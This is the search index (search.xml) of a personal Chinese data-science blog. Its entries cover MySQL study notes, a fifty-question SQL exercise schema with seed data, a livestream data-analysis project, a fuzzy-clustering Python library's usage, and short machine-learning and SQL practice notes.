<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>大数据学习中文文档</title>
      <link href="2021/04/09/da-shu-ju-xue-xi-zhong-wen-wen-dang/"/>
      <url>2021/04/09/da-shu-ju-xue-xi-zhong-wen-wen-dang/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.docs4dev.com/docs/zh/python/3.7.2rc1/all" target="_blank" rel="noopener">Python中文文档</a></p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference" target="_blank" rel="noopener">MySql 中文文档</a></p><p><a href="https://www.docs4dev.com/docs/zh/apache-hive/3.1.1/reference/" target="_blank" rel="noopener">Apache Hive 中文手册</a></p><p><a href="https://www.docs4dev.com/docs/zh/apache-hbase/2.1/reference" target="_blank" rel="noopener">Apache HBase 中文文档</a></p><p><a href="https://www.docs4dev.com/docs/zh/flume/1.9.0/reference" target="_blank" rel="noopener">Apache Flume 用户指南</a></p><p><a href="https://www.docs4dev.com/docs/zh/zookeeper/r3.5.6/reference" target="_blank" rel="noopener">ZooKeeper</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL底层原理及实操记录</title>
      <link href="2021/03/31/sql-di-ceng-yuan-li-ji-shi-cao-ji-lu/"/>
      <url>2021/03/31/sql-di-ceng-yuan-li-ji-shi-cao-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>MySQL45讲学习笔记,从底层原理上里理解关系型数据库并记录实操（MySQL8.0的一些新特性）</p><h1 id="MySQL底层原理"><a href="#MySQL底层原理" class="headerlink" title="MySQL底层原理"></a>MySQL底层原理</h1><h1 id="MySQL实操记录"><a href="#MySQL实操记录" class="headerlink" title="MySQL实操记录"></a>MySQL实操记录</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol><li>安装MySQL</li><li>安装Navicat（新手建议安装，非必须）</li></ol><p>靠谱参考教程：<a href="https://blog.csdn.net/qq_37350706/article/details/81707862" target="_blank" rel="noopener">https://blog.csdn.net/qq_37350706/article/details/81707862</a></p><h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><p>MySQL8.0中的group by有新特性，默认开启参数ONLY_FULL_GROUP_BY，可以通过输入以下命令查看：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@sql_mode</span><span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210331105532759.png" alt=""></p><p>默认开启参数ONLY_FULL_GROUP_BY，表示开启group by完全模式：即select后面跟的列group by后面也必须有，但是group by后面跟的列，select后面不一定需要出现。</p><p>故会出现以下情况：</p><p>1）报错：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> anchorinformation <span class="token keyword">group</span> <span class="token keyword">by</span> AnchorID<span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210331105924043.png" alt=""></p><p>2） 成功执行</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> AnchorID <span class="token keyword">from</span> anchorinformation <span class="token keyword">group</span> <span class="token keyword">by</span> AnchorID<span class="token punctuation">;</span></code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> AnchorID<span class="token punctuation">,</span>ANY_VALUE<span class="token punctuation">(</span>anchor<span class="token punctuation">)</span> <span class="token keyword">from</span> anchorinformation <span class="token keyword">group</span> <span class="token keyword">by</span> AnchorID<span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL五十题</title>
      <link href="2021/03/30/sql-wu-shi-ti/"/>
      <url>2021/03/30/sql-wu-shi-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>题目来自<a href="https://cloud.tencent.com/developer/article/1540526" target="_blank" rel="noopener">SQL练习题共50道附答案（MySQL）</a></p><p>此处不是正题，而是建表</p><p>1.学生表  student(s_id,s_name,s_birth,s_sex) </p><p>— 学生编号,学生姓名, 出生年月,学生性别 </p><p>2.课程表  course(c_id,c_name,t_id) </p><p>— 课程编号, 课程名称, 教师编号 </p><p>3.教师表  teacher(t_id,t_name) </p><p>-– 教师编号,教师姓名 </p><p>4.成绩表  score(s_id,c_id,s_score) </p><p>—学生编号,课程编号,分数</p><p>建议安装个Navicat，然后打开命令行，主要是界面看起来清爽（手动滑稽）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210331011629991.png" alt=""></p><p>命令如下</p><pre class=" language-lang-sql"><code class="language-lang-sql">--  建立课程表DROP TABLE IF EXISTS `course`;CREATE TABLE `course`  (  `c_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '课程编号',  `c_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '课程名称',  `t_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '教师编号',  PRIMARY KEY (`c_id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;-- 课程表数据INSERT INTO `course` VALUES ('01', '语文', '02');INSERT INTO `course` VALUES ('02', '数学', '01');INSERT INTO `course` VALUES ('03', '英语', '03');-- 分数表DROP TABLE IF EXISTS `score`;CREATE TABLE `score`  (  `s_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '学生编号',  `c_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '课程编号',  `s_score` int(3) NULL DEFAULT NULL COMMENT '分数',  PRIMARY KEY (`s_id`, `c_id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;-- 分数数据INSERT INTO `score` VALUES ('01', '01', 80);INSERT INTO `score` VALUES ('01', '02', 90);INSERT INTO `score` VALUES ('01', '03', 99);INSERT INTO `score` VALUES ('02', '01', 70);INSERT INTO `score` VALUES ('02', '02', 60);INSERT INTO `score` VALUES ('02', '03', 80);INSERT INTO `score` VALUES ('03', '01', 80);INSERT INTO `score` VALUES ('03', '02', 80);INSERT INTO `score` VALUES ('03', '03', 80);INSERT INTO `score` VALUES ('04', '01', 50);INSERT INTO `score` VALUES ('04', '02', 30);INSERT INTO `score` VALUES ('04', '03', 20);INSERT INTO `score` VALUES ('05', '01', 76);INSERT INTO `score` VALUES ('05', '02', 87);INSERT INTO `score` VALUES ('05', '03', 95);INSERT INTO `score` VALUES ('06', '01', 31);INSERT INTO `score` VALUES ('06', '02', 88);INSERT INTO `score` VALUES ('06', '03', 34);INSERT INTO `score` VALUES ('07', '01', 66);INSERT INTO `score` VALUES ('07', '02', 89);INSERT INTO `score` VALUES ('07', '03', 98);INSERT INTO `score` VALUES ('08', '01', 59);INSERT INTO `score` VALUES ('08', '02', 88);INSERT INTO `score` VALUES ('09', '02', 67);INSERT INTO `score` VALUES ('09', '03', 88);INSERT INTO `score` VALUES ('10', '01', 65);INSERT INTO `score` VALUES ('10', '02', 78);-- 建立学生表DROP TABLE IF EXISTS `student`;CREATE TABLE `student`  (  `s_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '学生编号',  `s_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '学生姓名',  `s_birth` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '出生年月',  `s_sex` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '学生性别',  PRIMARY KEY (`s_id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;-- 学生数据INSERT INTO `student` VALUES ('01', '斯内克', '1990-01-01', '男');INSERT INTO `student` VALUES ('02', '张益达', '1990-12-21', '男');INSERT INTO `student` VALUES ('03', '张大炮', '1990-05-20', '男');INSERT INTO `student` VALUES ('04', '李云龙', '1990-08-06', '男');INSERT INTO `student` VALUES ('05', '楚云飞', '1991-12-01', '女');INSERT INTO `student` VALUES ('06', '赵日天', '1992-03-01', '女');INSERT INTO `student` VALUES ('07', '小甜甜', '1989-07-01', '女');INSERT INTO `student` VALUES ('08', '王菊花', '1990-01-20', '女');INSERT INTO `student` VALUES ('09', '李慕白', '1994-01-20', '男');INSERT INTO `student` VALUES ('10', '东京热', '1980-01-20', '女');-- 建立老师表DROP TABLE IF EXISTS `teacher`;CREATE TABLE `teacher`  (  `t_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '教师编号',  `t_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '教师姓名',  PRIMARY KEY (`t_id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;-- 老师表数据INSERT INTO `teacher` VALUES ('01', '墨白');INSERT INTO `teacher` VALUES ('02', '默狐');INSERT INTO `teacher` VALUES ('03', '柠檬');SET FOREIGN_KEY_CHECKS = 1;</code></pre><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>1、查询”语文”课程比”数学”课程成绩高的学生的信息及课程分数 </p><pre class=" language-lang-sql"><code class="language-lang-sql"></code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://cloud.tencent.com/developer/article/1540526" target="_blank" rel="noopener">SQL练习题共50道附答案（MySQL）——墨白的Java基地</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虎牙直播数据分析展示</title>
      <link href="2021/03/29/hu-ya-zhi-bo-shu-ju-fen-xi-zhan-shi/"/>
      <url>2021/03/29/hu-ya-zhi-bo-shu-ju-fen-xi-zhan-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>注：本项目仅用于学习/研究，图片等版权均归原公司所有，侵删</p><ul><li>python爬取虎牙直播某个时刻的直播数据</li><li>画图</li><li>制作PPT（此处仅放置图片，需要PPT请联系:<a href="mailto:caiwei-email@qq.com">caiwei-email@qq.com</a>）</li></ul><p>项目地址（源码）：<a href="https://github.com/ChoiNgai/DataAnalysis_huya" target="_blank" rel="noopener">https://github.com/ChoiNgai/DataAnalysis_huya</a></p><h2 id="展示报告"><a href="#展示报告" class="headerlink" title="展示报告"></a>展示报告</h2><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/033100164494_0%E8%99%8E%E7%89%99%E7%9B%B4%E6%92%AD%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A_1.Jpeg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/033100164494_0%E8%99%8E%E7%89%99%E7%9B%B4%E6%92%AD%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A_2.Jpeg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/033100164494_0%E8%99%8E%E7%89%99%E7%9B%B4%E6%92%AD%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A_3.Jpeg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/033100164494_0%E8%99%8E%E7%89%99%E7%9B%B4%E6%92%AD%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A_5-1.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/033100164494_0%E8%99%8E%E7%89%99%E7%9B%B4%E6%92%AD%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A_6.Jpeg" alt=""></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL45讲</title>
      <link href="2021/03/29/mysql45-jiang/"/>
      <url>2021/03/29/mysql45-jiang/</url>
      
        <content type="html"><![CDATA[<p>《MySQL45》讲转载，侵删</p><p><a href="https://sao-operation.gitee.io/my-sql45/01.基础架构：一条SQL查询语句是如何执行的？.html" target="_blank" rel="noopener">01.基础架构：一条SQL查询语句是如何执行的？.html        </a><br><a href="https://sao-operation.gitee.io/my-sql45/02.日志系统：一条SQL更新语句是如何执行的？.html" target="_blank" rel="noopener">02.日志系统：一条SQL更新语句是如何执行的？.html        </a><br><a href="https://sao-operation.gitee.io/my-sql45/03.事务隔离：为什么你改了我还看不见？.html" target="_blank" rel="noopener">03.事务隔离：为什么你改了我还看不见？.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/04.深入浅出索引（上）.html" target="_blank" rel="noopener">04.深入浅出索引（上）.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/05.深入浅出索引（下）.html" target="_blank" rel="noopener">05.深入浅出索引（下）.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/06.全局锁和表锁%20：给表加个字段怎么有这么多阻碍？.html" target="_blank" rel="noopener">06.全局锁和表锁 ：给表加个字段怎么有这么多阻碍？.html </a><br><a href="https://sao-operation.gitee.io/my-sql45/07.行锁功过：怎么减少行锁对性能的影响？.html" target="_blank" rel="noopener">07.行锁功过：怎么减少行锁对性能的影响？.html           </a><br><a href="https://sao-operation.gitee.io/my-sql45/08.事务到底是隔离的还是不隔离的？.htmla" target="_blank" rel="noopener">08.事务到底是隔离的还是不隔离的？.htmla                </a><br><a href="https://sao-operation.gitee.io/my-sql45/09.普通索引和唯一索引，应该怎么选择？.html" target="_blank" rel="noopener">09.普通索引和唯一索引，应该怎么选择？.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/10.MySQL为什么有时候会选错索引？.html" target="_blank" rel="noopener">10.MySQL为什么有时候会选错索引？.html                  </a><br><a href="https://sao-operation.gitee.io/my-sql45/11.怎么给字符串字段加索引？.html" target="_blank" rel="noopener">11.怎么给字符串字段加索引？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/12.为什么我的MySQL会&quot;抖&quot;一下？.html" target="_blank" rel="noopener">12.为什么我的MySQL会“抖”一下？.html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/13.为什么表数据删掉一半，表文件大小不变？.html" target="_blank" rel="noopener">13.为什么表数据删掉一半，表文件大小不变？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/14.count(×" target="_blank" rel="noopener">14.count(×)这么慢，我该怎么办？.html                   </a>这么慢，我该怎么办？.html                    )<br><a href="https://sao-operation.gitee.io/my-sql45/15.答疑文章（一）：日志和索引相关问题.html" target="_blank" rel="noopener">15.答疑文章（一）：日志和索引相关问题.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/16.&quot;order_by&quot;是怎么工作的？(1" target="_blank" rel="noopener">16.“order by”是怎么工作的？(1).html                    </a>.html                     )<br><a href="https://sao-operation.gitee.io/my-sql45/16.&quot;order_by&quot;是怎么工作的？.html" target="_blank" rel="noopener">16.“order by”是怎么工作的？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/17.如何正确地显示随机消息？(1" target="_blank" rel="noopener">17.如何正确地显示随机消息？(1).html                    </a>.html                     )<br><a href="https://sao-operation.gitee.io/my-sql45/17.如何正确地显示随机消息？.html" target="_blank" rel="noopener">17.如何正确地显示随机消息？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/18.为什么这些SQL语句逻辑相同性能却差异巨大？.html" target="_blank" rel="noopener">18.为什么这些SQL语句逻辑相同性能却差异巨大？.html      </a><br><a href="https://sao-operation.gitee.io/my-sql45/18.为什么这些SQL语句逻辑相同，性能却差异巨大？.html" target="_blank" rel="noopener">18.为什么这些SQL语句逻辑相同，性能却差异巨大？.html    </a><br><a href="https://sao-operation.gitee.io/my-sql45/19.为什么我只查一行的语句也执行这么慢？.html" target="_blank" rel="noopener">19.为什么我只查一行的语句也执行这么慢？.html           </a><br><a href="https://sao-operation.gitee.io/my-sql45/19.为什么我只查一行的语句，也执行这么慢？.html" target="_blank" rel="noopener">19.为什么我只查一行的语句，也执行这么慢？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/20.幻读是什么幻读有什么问题？.html" target="_blank" rel="noopener">20.幻读是什么幻读有什么问题？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/21.为什么我只改一行的语句锁这么多？.html" target="_blank" rel="noopener">21.为什么我只改一行的语句锁这么多？.html               </a><br><a href="https://sao-operation.gitee.io/my-sql45/22.MySQL有哪些&quot;饮鸩止渴&quot;提高性能的方法？.html" target="_blank" rel="noopener">22.MySQL有哪些“饮鸩止渴”提高性能的方法？.html          </a><br><a href="https://sao-operation.gitee.io/my-sql45/23.MySQL是怎么保证数据不丢的？.html" target="_blank" rel="noopener">23.MySQL是怎么保证数据不丢的？.html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/24.MySQL是怎么保证主备一致的？.html" target="_blank" rel="noopener">24.MySQL是怎么保证主备一致的？.html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/25.MySQL是怎么保证高可用的？.html" target="_blank" rel="noopener">25.MySQL是怎么保证高可用的？.html                      </a><br><a href="https://sao-operation.gitee.io/my-sql45/26.备库为什么会延迟好几个小时？.html" target="_blank" rel="noopener">26.备库为什么会延迟好几个小时？.html                   </a><br><a href="https://sao-operation.gitee.io/my-sql45/27.主库出问题了从库怎么办？.html" target="_blank" rel="noopener">27.主库出问题了从库怎么办？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/28.读写分离有哪些坑？.html" target="_blank" rel="noopener">28.读写分离有哪些坑？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/29.如何判断一个数据库是不是出问题了？.html" target="_blank" rel="noopener">29.如何判断一个数据库是不是出问题了？.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/30.答疑文章（二）：用动态的观点看加锁.html" target="_blank" rel="noopener">30.答疑文章（二）：用动态的观点看加锁.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/31.误删数据后除了跑路还能怎么办？.html" target="_blank" rel="noopener">31.误删数据后除了跑路还能怎么办？.html                 </a><br><a href="https://sao-operation.gitee.io/my-sql45/32.为什么还有kill不掉的语句？.html" target="_blank" rel="noopener">32.为什么还有kill不掉的语句？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/33.我查这么多数据会不会把数据库内存打爆？.html" target="_blank" rel="noopener">33.我查这么多数据会不会把数据库内存打爆？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/34.到底可不可以使用join？.html" target="_blank" rel="noopener">34.到底可不可以使用join？.html                         </a><br><a href="https://sao-operation.gitee.io/my-sql45/35.join语句怎么优化？.html" target="_blank" rel="noopener">35.join语句怎么优化？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/36.为什么临时表可以重名？.html" target="_blank" rel="noopener">36.为什么临时表可以重名？.html                         </a><br><a href="https://sao-operation.gitee.io/my-sql45/37.什么时候会使用内部临时表？.html" target="_blank" rel="noopener">37.什么时候会使用内部临时表？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/38.都说InnoDB好那还要不要使用Memory引擎？.html" target="_blank" rel="noopener">38.都说InnoDB好那还要不要使用Memory引擎？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/39.自增主键为什么不是连续的？.html" target="_blank" rel="noopener">39.自增主键为什么不是连续的？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/40.insert语句的锁为什么这么多？.html" target="_blank" rel="noopener">40.insert语句的锁为什么这么多？.html                   </a><br><a href="https://sao-operation.gitee.io/my-sql45/41.怎么最快地复制一张表？.html" target="_blank" rel="noopener">41.怎么最快地复制一张表？.html                         </a><br><a href="https://sao-operation.gitee.io/my-sql45/42.grant之后要跟着flush_privileges吗？.html" target="_blank" rel="noopener">42.grant之后要跟着flush privileges吗？.html            </a><br><a href="https://sao-operation.gitee.io/my-sql45/43.要不要使用分区表？.html" target="_blank" rel="noopener">43.要不要使用分区表？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/44.答疑文章（三）：说一说这些好问题.html" target="_blank" rel="noopener">44.答疑文章（三）：说一说这些好问题.html               </a><br><a href="https://sao-operation.gitee.io/my-sql45/45.自增id用完怎么办？.html" target="_blank" rel="noopener">45.自增id用完怎么办？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/IT视频学习网-www.itspxx.com.url" target="_blank" rel="noopener">IT视频学习网-www.itspxx.com.url                        </a><br><a href="https://sao-operation.gitee.io/my-sql45/开篇词.这一次，让我们一起来搞懂MySQL.html" target="_blank" rel="noopener">开篇词.这一次，让我们一起来搞懂MySQL.html              </a><br><a href="https://sao-operation.gitee.io/my-sql45/文档列表.bat" target="_blank" rel="noopener">文档列表.bat                                           </a><br><a href="https://sao-operation.gitee.io/my-sql45/更多精品教程-itspxx.com.url" target="_blank" rel="noopener">更多精品教程-itspxx.com.url                            </a><br><a href="https://sao-operation.gitee.io/my-sql45/本教程由IT视频学习网提供.url" target="_blank" rel="noopener">本教程由IT视频学习网提供.url                           </a><br><a href="https://sao-operation.gitee.io/my-sql45/直播回顾.林晓斌：我的MySQL心路历程.html" target="_blank" rel="noopener">直播回顾.林晓斌：我的 MySQL 心路历程.html              </a><br><a href="https://sao-operation.gitee.io/my-sql45/结束语.点线网面一起构建MySQL知识网络.html" target="_blank" rel="noopener">结束语.点线网面一起构建MySQL知识网络.html              </a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>模糊聚类算法python版</title>
      <link href="2021/03/27/mo-hu-ju-lei-suan-fa-python-ban/"/>
      <url>2021/03/27/mo-hu-ju-lei-suan-fa-python-ban/</url>
      
        <content type="html"><![CDATA[<h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>本开源项目为模糊聚类算法python代码，主要算法包括：</p><ul><li>FCM（模糊C均值算法）</li><li>MEC （极大熵模糊聚类算法）</li><li>KFCM（核模糊聚类算法）</li><li>SFCM （半监督模糊聚类算法）</li><li>eSFCM （基于信息熵的半监督模糊聚类算法）</li><li>SMUC （基于度量学习与信息熵的半监督模糊聚类算法）</li></ul><p>项目链接：<a href="https://github.com/ChoiNgai/FuzzyClustering" target="_blank" rel="noopener">https://github.com/ChoiNgai/FuzzyClustering</a></p><p>以这些算法为基础的相关论文可参考本人的谷歌学术主页：<a href="https://scholar.google.com/citations?view_op=list_works&amp;hl=zh-CN&amp;user=pYX8lisAAAAJ" target="_blank" rel="noopener">Wei Cai，Guangdong University of Technology</a></p><p>如有问题欢迎邮件一起探讨：caiwei-email@qq.com</p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ul><li>dataset：数据集</li><li>ClusterAidedComputing.py ：包括聚类常用的一些函数</li><li>ClusteringIteration.py ：包括聚类算法迭代式</li><li>FuzzyClustering.py ：模糊聚类算法</li><li>demo.py ： 演示脚本（运行此程序）</li></ul><p>算法都封装在FuzzyClustering.py里，FuzzyClustering.py调用ClusterAidedComputing.py和ClusteringIteration.py</p><h2 id="算法调用"><a href="#算法调用" class="headerlink" title="算法调用"></a>算法调用</h2><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>（以下为所有模糊聚类算法都有的参数）</p><p>data ：数据集，统一使用数组（darry）</p><p>cluster_n ：类簇中心数 </p><p>max_iter ：最大迭代次数</p><p>e ：目标函数值变化最小阈值</p><p>printOn ：打印迭代情况开关（当printOn=1时打印迭代情况）</p><h3 id="调用规则"><a href="#调用规则" class="headerlink" title="调用规则"></a>调用规则</h3><p>所有的函数都需要输入data和cluster_n，其余参数可能有预设参数（若有预设参数则可以不输入，不输入则采用默认参数）</p><h3 id="算法函数"><a href="#算法函数" class="headerlink" title="算法函数"></a>算法函数</h3><ul><li>FCM</li></ul><pre class=" language-lang-python"><code class="language-lang-python">U,V,obj_fcn = fcm(data,cluster_n,m = 2,max_iter = 1000,e = 0.00001,printOn = 1)</code></pre><p>或</p><pre class=" language-lang-python"><code class="language-lang-python">U,V,obj_fcn = fcm(data,cluster_n)</code></pre><p>如上，m ,max_iter,e ,printOn这四个参数已有默认参数，可不设置 </p><ul><li>MEC</li></ul><pre class=" language-lang-python"><code class="language-lang-python">U,V,obj_fcn = mec(data,cluster_n,gamma=0.01,max_iter = 1000,e = 0.00001,printOn = 1)</code></pre><p>gamma ：惩罚系数</p><ul><li><p>KFCM</p><p>sigma ：高斯核标准差</p><p>lamda ：惩罚系数</p></li></ul><pre class=" language-lang-python"><code class="language-lang-python">kfcm(data,cluster_n,sigma=2,m=2,lamda=0.1,max_iter = 1000,e = 0.00001,printOn = 1)</code></pre><ul><li>SFCM</li></ul><pre class=" language-lang-python"><code class="language-lang-python">U,V,obj_fcn = sfcm(data,cluster_n,label,m = 2,max_iter = 1000,e = 0.00001,alpha=5,printOn = 1)</code></pre><p>label ：标签（array格式）</p><ul><li>eSFCM</li></ul><pre class=" language-lang-python"><code class="language-lang-python">U,V,obj_fcn = esfcm(data,cluster_n,label,max_iter = 1000,e = 0.00001,lamda=1,printOn = 1)</code></pre><ul><li>SMUC</li></ul><pre class=" language-lang-smuc"><code class="language-lang-smuc">U,V,obj_fcn = smuc(data,cluster_n,label,max_iter = 1000,e = 0.5,lamda=1,printOn = 1)</code></pre><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>迭代目标函数值变化图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/Figure_1.png" alt="Figure_1"><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210325193158437.png" alt="image-20210325193158437"></p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模糊聚类 </tag>
            
            <tag> 弱监督学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习练习笔记</title>
      <link href="2021/03/23/ji-qi-xue-xi-lian-xi-bi-ji/"/>
      <url>2021/03/23/ji-qi-xue-xi-lian-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h1><ol><li><p>计算三个稠密矩阵A,B,C的乘积ABC，假设三个矩阵的尺寸分别是m <em> n,n </em> p,p* q,且m &lt; n &lt; p &lt; q，则计算效率最高顺序是：</p><p>ABC</p><p>解析：(AB)C</p><p>(AB)C先计算AB，AB相乘的计算次数为m <em> n </em> p（m行，每一行中又n列乘以p行，画出矩阵来容易理解），（AB）与C相乘的次数为 m <em> p </em> q，则计算总次数为：m <em> n </em> p + m <em> p </em> q</p><p>而A(BC)的计算次数为n <em> p </em> q + m <em> n </em> q</p></li><li></li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL实战</title>
      <link href="2021/03/19/sql-shi-zhan/"/>
      <url>2021/03/19/sql-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>主要是讲一些常见的实用命令</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>创建数据库DATAuser以及表A</p><pre><code>CREATE DATABASE DATAuserCREATE TABLE A(userid int,userName varchar,Address varchar,Age int,sex varchar,login_day     date,login_time     time)</code></pre><ol><li><p>半小时内登录的用户</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from Awhere datediff('h',DateTime,now())<=0.5</code></pre></li><li><p>某一天登录的用户</p><pre class=" language-lang-sql"><code class="language-lang-sql">select * from Awhere login_day = '2021-3-19'</code></pre></li><li><p>连续三天登录的用户</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT userid,time,DATE_SUB(left(time,10),INTERVAL t.rn DAY) as flag_date,count(distinct left(time,10))from (SELECT userid,time,dense_rank ()over(PARTITION by userid ORDER BY time) as rnfrom  table_A) as tGROUP BY user_id,flag_dateHAVING count(distinct left(time,10))>=3;</code></pre></li><li></li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL练习</title>
      <link href="2021/02/23/sql-lian-xi/"/>
      <url>2021/02/23/sql-lian-xi/</url>
      
